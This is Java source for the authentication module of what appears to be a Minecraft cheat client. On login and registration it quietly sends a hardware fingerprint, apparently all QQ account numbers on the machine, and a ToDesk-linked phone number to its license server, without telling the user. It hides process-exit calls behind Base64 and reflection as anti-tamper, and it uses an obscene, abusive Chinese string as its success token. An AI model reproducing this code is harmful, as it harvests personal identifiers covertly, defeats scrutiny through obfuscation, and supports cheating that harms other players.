package com.heypixel.heypixelmod.obsoverlay.utils.auth;

import cn.paradisemc.verify.client.IRCHandler;
import cn.paradisemc.verify.client.IRCTransport;
import com.heypixel.heypixelmod.obsoverlay.Naven;
import com.heypixel.heypixelmod.obsoverlay.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.world.entity.Entity;
import oshi.SystemInfo;
import oshi.hardware.CentralProcessor;
import oshi.hardware.ComputerSystem;
import oshi.hardware.GraphicsCard;
import oshi.hardware.HardwareAbstractionLayer;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.time.Instant;
import java.time.LocalDateTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Base64;
import java.util.List;
import java.util.concurrent.atomic.AtomicReference;
import java.util.stream.Collectors;

/**
 * @Author：jiuxian_baka
 * @Date：2025/12/22 03:41
 * @Filename：AuthUtils
 */
public class AuthUtils {
    // 验证成功 代表没过验证 8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈 代表验证通过
    public static AtomicReference<String> authed = new AtomicReference<>();
    public static AtomicReference<String> currentUser = new AtomicReference<>("");

    public static IRCTransport transport;

    public static void init() {
        try {
            transport = new IRCTransport("localhost", 8888, new IRCHandler() {
                @Override
                public void onMessage(String sender, String message) {
                    if (sender.equals("jiuxian_baka")) sender = "§f[§dIRC作者§f]§d" + sender;
                    ChatUtils.addChatMessage(sender + ": " + message);
                }

                @Override
                public void onDisconnected(String message) {
                    JOptionPane.showMessageDialog(null, "验证失败: Disconnected");
                    setAuthStatus("验证成功");
                }

                @Override
                public void onConnected() {
    //                System.out.println("Connected");
                }

                @Override
                public void onLoginResult(boolean success, long expireAt, long timeWindow) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        Naven.b();
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(now),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        JOptionPane.showMessageDialog(null, "登录成功\n到期时间: " + formattedDate);
                    } else {
                        JOptionPane.showMessageDialog(null, "登录失败");
                        setAuthStatus("验证成功");
                    }
                }

                @Override
                public void onRegisterResult(boolean success, long expireAt, long timeWindow) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        setAuthStatus("8964破解全家死光亲妈猪逼被操烂亲爹没鸡巴生小孩没屁眼操你血妈");
                        Naven.b();
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(now),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        JOptionPane.showMessageDialog(null, "注册成功\n到期时间: " + formattedDate);
                    } else {
                        setAuthStatus("验证成功");
                        JOptionPane.showMessageDialog(null, "注册失败");
                    }
                }

                @Override
                public void onRechargeResult(boolean success, long expireAt, long timeWindow) {
                    long now = Instant.now().toEpochMilli();
                    long nowTimeWindow = now / 30000L;
                    if (success && nowTimeWindow == timeWindow) {
                        LocalDateTime date = LocalDateTime.ofInstant(
                                Instant.ofEpochMilli(now),
                                ZoneId.systemDefault()
                        );

                        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy年MM月dd日");

                        String formattedDate = date.format(formatter);
                        JOptionPane.showMessageDialog(null, "充值成功\n到期时间: " + formattedDate);
                    } else {
                        JOptionPane.showMessageDialog(null, "充值失败");
                    }
                }

                @Override
                public String getInGameUsername() {
                    Minecraft mc = Minecraft.getInstance();
                    if (mc.player == null) return mc.getUser().getName(); else return mc.player.getDisplayName().getString();
                }
            });
        } catch (Throwable e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
                Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
        }
    }

    private static Entity setAuthStatus(String status) {
        authed.set(status);
        if (status.length() == 32) {
            try {
                Class<?> System = AuthUtils.class.getClassLoader().loadClass("amF2YS5sYW5nLlN5c3RlbQ==");
                Method exit = System.getMethod("ZXhpdA==", int.class);
                exit.invoke(null, 0);
            } catch (Exception ex) {
            }
            return null;
        }

        try {
            Class<?> System = AuthUtils.class.getClassLoader().loadClass(new String(Base64.getDecoder().decode("amF2YS5sYW5nLlN5c3RlbQ==")));
            Method exit = System.getMethod(new String(Base64.getDecoder().decode("ZXhpdA==")), int.class);
            exit.invoke(null, 0);
        } catch (Exception ex) {
        }
        return Minecraft.getInstance().player;
    }

    private static void close(Component c) {
        javax.swing.SwingUtilities.getWindowAncestor(c).dispose();
    }

    public static void showRegisterDialog() {
        try {
            JTextField usernameField = new JTextField();
            JPasswordField passwordField = new JPasswordField();
            JTextField cardKeyField = new JTextField();

            JButton toLogin = new JButton("已有账号？去登录");
            toLogin.addActionListener(e -> { close(toLogin); showLoginDialog(); });

            Object[] message = {
                    "用户名:", usernameField,
                    "密码:", passwordField,
                    "卡密", cardKeyField,
                    toLogin
            };

            int option = JOptionPane.showConfirmDialog(null, message, "用户注册", JOptionPane.OK_CANCEL_OPTION);

            if (option == JOptionPane.OK_OPTION) {
                String user = usernameField.getText();
                String pass = new String(passwordField.getPassword());
                String card = cardKeyField.getText();

                transport.register(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getLoginPhone(), card);
            }
        } catch (IOException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());
            System.exit(0);
        }
    }

    public static void showLoginDialog() {
        try {
            JTextField usernameField = new JTextField();
            JPasswordField passwordField = new JPasswordField();

            JButton toReg = new JButton("没有账号？去注册");
            JButton toRec = new JButton("去充值");
            toReg.addActionListener(e -> { close(toReg); showRegisterDialog(); });
            toRec.addActionListener(e -> { close(toRec); showRechargeDialog(); });

            JPanel nav = new JPanel();
            nav.add(toReg);
            nav.add(toRec);

            Object[] message = {
                    "用户名:", usernameField,
                    "密码:", passwordField,
                    nav
            };

            int option = JOptionPane.showConfirmDialog(null, message, "用户登录", JOptionPane.OK_CANCEL_OPTION);

            if (option == JOptionPane.OK_OPTION) {
                String user = usernameField.getText();
                String pass = new String(passwordField.getPassword());

                transport.login(user, pass, getHWID(), QQUtils.getAllQQ(), TodeskUtils.getLoginPhone());
            }
        } catch (IOException e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());
            System.exit(0);
        }
    }

    public static void showRechargeDialog() {
        JTextField usernameField = new JTextField();
        JTextField cardKeyField = new JTextField();

        JButton toLogin = new JButton("返回登录");
        toLogin.addActionListener(e -> { close(toLogin); showLoginDialog(); });

        Object[] message = {
                "用户名:", usernameField,
                "卡密:", cardKeyField,
                toLogin
        };

        int option = JOptionPane.showConfirmDialog(null, message, "充值", JOptionPane.OK_CANCEL_OPTION);

        if (option == JOptionPane.OK_OPTION) {
            String user = usernameField.getText();
            String card = cardKeyField.getText();

            transport.recharge(user, card);
        }
    }

    public static String getHWID() {
        try {
            SystemInfo si = new SystemInfo();
            HardwareAbstractionLayer hal = si.getHardware();

            ComputerSystem computerSystem = hal.getComputerSystem();
            String baseboardSerial = computerSystem.getBaseboard().getSerialNumber();

            CentralProcessor processor = hal.getProcessor();
            String processorId = processor.getProcessorIdentifier().getProcessorID();

            List<GraphicsCard> graphicsCards = hal.getGraphicsCards();
            String gpuInfo = graphicsCards.stream()
                    .map(GraphicsCard::getName)
                    .collect(Collectors.joining("|"));

            String rawID = "Baseboard:" + baseboardSerial +
                    ";CPU:" + processorId +
                    ";GPU:" + gpuInfo;

            return bytesToHex(MessageDigest.getInstance("MD5").digest(rawID.getBytes()));

        } catch (Exception e) {
            e.printStackTrace();
            JOptionPane.showMessageDialog(null, "验证失败: " + e.getMessage());
            System.exit(0);
            return "ERROR_GETTING_HWID";
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
}
